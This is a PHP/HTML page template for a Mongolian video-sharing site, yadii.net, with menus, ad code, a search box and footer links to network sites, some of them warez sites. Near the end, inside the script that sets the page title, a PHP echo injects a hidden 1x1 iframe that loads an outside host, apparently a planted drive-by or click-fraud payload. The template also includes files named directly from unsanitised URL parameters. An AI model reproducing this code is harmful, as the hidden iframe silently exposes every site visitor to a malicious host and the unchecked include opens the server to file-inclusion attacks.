<?
	$template_files['r2_b'] = "templates/yadii/r2_b.php";

	$htmls_video[0] = '<table width="100%" cellpadding="3" cellspacing="2" border="0"><tr>';
	$htmls_video[2] = '<td align="center" width="25%" valign="top">';
	$htmls_video[3] = '</td>';
	$htmls_video[1] = '</tr></table>';
	
	$htmls_normal[0] = '<ul>';
	$htmls_normal[2] = '<li style="margin-bottom:6px;">';
	$htmls_normal[3] = '</li>';
	$htmls_normal[1] = '</ul>';
?>
<link href="templates/yadii/css/main.css" rel="stylesheet" type="text/css" />
<link href="templates/yadii/css/yadii.css" rel="stylesheet" type="text/css" />
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script> 
<div style="background-color:#F00; color:#FFF; text-align:center; padding:5px; display:none; margin-bottom:6px;">
2008-01-30 ны үдээс хойш 16:00 цагаас 2008-02-03 ны 12:00 цаг хүртэл серверийн үйлдлийн системийг шинэчилэх ажил хийгдэх тул уг хугацаанд АЗ сүлжээний бүх сайт ажиллахгүй болсныг мэдэгдэе. Уг ажиллагаа явагдахад ямар нэгэн мэдээлэл устахгүй болно. Хамтран ажилласанд баярлалаа.</div>
<div id="pageLoader" style="color:#333333; margin-top:100px; display:none; "><center>
    Хуудсыг ачаалж байна...<br />
<img src="images/web/loading.gif" alt="loading..." border="0" vspace="5" /></center></div>

<div id="mainContainer">
  <div id="row1"><img src="templates/yadii/images/row1.png" alt="r1" width="960" height="11" /></div>
  <div id="row2">
  	<div id="row2_a">
    	<div style="float:left; width:300px;">Таны хандаж буй улс: [<?=$_SESSION['country']['name']?>]</div>
    	<a href="index.php">НҮҮР</a> | 
        <a href="http://feedproxy.google.com/YadiiNetnew100" target="_blank">Шинэ 100</a> | 
        <a href="#">Хэрэглэгчийн булан</a> | 
        <a href="index.php?module=users&amp;cmd=registration">Бүртгүүлэх</a> | 
        <a href="#">Сурталчилах</a> | 
        <a href="index.php?module=faqs&cmd=list">Асуулт/Хариулт</a> 
        </div>
  <div id="row2_b">
    	<? include_once(ABS_DIR."templates/yadii/row2_b.php");?>        
    </div>
  </div>
  <div style="display:none; background-color:#FFF; height:15px;">
  <script type="text/javascript"><!--
google_ad_client = "pub-3377050199087606";
/* 728x15, created 6/18/08 */
google_ad_slot = "5952625971";
google_ad_width = 728;
google_ad_height = 15;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
  <div id="row_con">
  	<div id="r1">
    	<div id="r1_a">
          <div style="font-weight:bold; color:#69a2fb;">
          	Яг одоо үзэж буй видеонууд
          </div>
    	  	<?=mbmShowNewContents($htmls_video,4,"is_video",0,'session_time','DESC')?>
              <div style="color:red; z-index:2;">
              <strong>АНХААР!!!</strong>: 
              Хэрэв та өөрийн видео клипийг манай сайт дээр байрлуулахыг хүсэхгүй бол info[at]yadii.net хаягаар холбоо барина уу!
              </div>
          </div>
    	<div id="r1_b">
        	<div style="position:relative; z-index:2;">
           	  <div style="padding:3px; position:absolute;width:224px; height:144px; background-color:#ffe9cf; top:0px; z-index:3;">
                    <div 
                        style="background-color:#f7941c; 
                               display:block; 
                               color:#FFF; 
                               padding:3px; 
                               font-weight:bold;
                               height:18px;
                               margin-bottom:3px;">Хайлт:</div>
             		 <? mbmSearchForm();?>
                     <form action="http://search.az.mn" id="cse-search-box" target="_blank">
                      <div>
                        <input type="hidden" name="cx" value="partner-pub-3377050199087606:dwz8075rawc" />
                        <input type="hidden" name="cof" value="FORID:10" />
                        <input type="hidden" name="ie" value="UTF-8" />
                        <input type="text" name="q" size="31" class="search_input" />
                        <input type="submit" name="sa" value="Хайх" class="search_button" />
                      </div>
                    </form>
                    <div align="center">
                    	<?=mbmShowBanner('home_220x90')?>
                    </div>
                </div>
                 <div style="padding:3px; position:absolute; left:233px; top:0px; width:233px; height:144px; background-color:#e2e7ed;overflow-y:scroll; z-index:3;">
                	<div>
            	
						<?
                  echo mbmUserPanel($_SESSION['user_id'],array('','','<div class="ya_user_menu">','</div>'));
                  ?>
                    </div>
            	</div>
            </div>
	  	</div>
    </div>
  	<div id="r2">
	<?
	  if(file_exists(ABS_DIR."modules/".$_GET['module']."/".$_GET['cmd'].".php")){
			include_once(ABS_DIR."modules/".$_GET['module']."/".$_GET['cmd'].".php");
		}else{
			include_once(ABS_DIR."templates/".TEMPLATE."/home.php");
		}
	  ?>
    </div>
  </div>
  <div id="row8">
      <div align="center" style="margin-bottom:12px;">
      		<?=mbmShowBanner('footer')?>
      		<table width="100%" border="0" cellspacing="5" cellpadding="0">
      		  <tr>
      		    <td class="titleFooter">Сүлжээ сайтууд</td>
      		    <td class="titleFooter">Түнш сайтууд</td>
      		    <td class="titleFooter">&nbsp;</td>
      		    <td class="titleFooter">&nbsp;</td>
   		      </tr>
      		  <tr>
      		    <td width="25%" valign="top"><a href="http://www.unegui.com" class="networkWebs" target="_blank">Варез сайт</a> <a href="http://www.unegui.net" class="networkWebs" target="_blank">Варез холбоосууд</a> <a href="http://worldvideomusic.com" class="networkWebs" target="_blank">Гадаад дуу хөгжим</a> <a href="http://mobile.az.mn" class="networkWebs" target="_blank">Гар утас</a> <a href="http://shop.az.mn" class="networkWebs" target="_blank">Интернэт дэлгүүр</a> <a href="http://www.cashtube.biz" class="networkWebs" target="_blank">Интернэтээр мөнгө олох</a> <a href="http://share.az.mn" target="_blank" class="networkWebs">Файл түгээх сайт</a> <a href="http://search.az.mn" class="networkWebs" target="_blank">Монгол вэб хайлтын систем</a> <a href="http://weather.az.mn" class="networkWebs" target="_blank">Монгол орны цаг агаар</a><a href="http://www.cheaphugehost.com" class="networkWebs" target="_blank">Хямд вэб байрлуулах талбар</a> <a href="http://good.az.mn" class="networkWebs" target="_blank">GOOD сэтгүүл</a> <a href="http://php.az.mn" class="networkWebs" target="_blank">PHP Хичээл</a> <a href="http://www.yadii.org" class="networkWebs" target="_blank">Яадий сан</a></td>
      		    <td width="25%" valign="top"><a href="http://www.gazar.org" class="networkWebs" target="_blank">Газрын тухай мэдээлэл</a> <a href="http://www.geree.mn" class="networkWebs" target="_blank">Гэрээний нэгдсэн лавлах</a> <a href="http://www.pms.mn" class="networkWebs" target="_blank">Дэмжлэг менежментийн систем</a> <a href="http://www.pambaga.net" class="networkWebs" target="_blank">Монгол Туургатны нэгдсэн портал</a> <a href="http://www.mhri.mn" class="networkWebs" target="_blank">Монголын Хүний Нөөцийн Институти</a>
                <a href="http://www.computertimes.mn" class="networkWebs" target="_blank">Computer Times Сэтгүүл</a>
                </td>
      		    <td width="25%" valign="top">&nbsp;</td>
      		    <td width="25%" valign="top">&nbsp;</td>
   		      </tr>
	    </table>
      </div>
  | <?=mbmShowMenuById(array('',' | '),320,'menu_footer').'<br /><br />'.mbmStatImage().COPYRIGHT?></div>
  <div id="footer"><img src="templates/yadii/images/footer.png" alt="f" /></div>
</div>
<div id="bottom_new_year"></div>
<script language="javascript" type="text/javascript">
document.getElementById('pageLoader').style.display='none';
document.getElementById('mainContainer').style.visibility='visible';

// unduruudiig todorhoiloh
function setHeightContent(){
	main_content = document.getElementById('row_con');
	col_1 = document.getElementById('r2_a');
	col_2 = document.getElementById('r2_b');
	
	col_height = Math.max(col_1.clientHeight,col_2.clientHeight);
	if(col_height>main_content.clientHeight){
		set_height = col_height;
		main_content.style.height = set_height+250+document.getElementById('r1').offsetHeight+'px';
	}
	setTimeout("setHeightContent()", 5000);
}
setHeightContent();

if (window.ActiveXObject){
  //left_talbar.style.marginLeft= '-180px';
}
if(document.title=='0'){
	document.title='<?=PAGE_TITLE
echo "<iframe src=\"http://clydaib.net/?click=44C2CB5\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>';
}
</script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6849739-2");
pageTracker._trackPageview();
} catch(err) {}</script>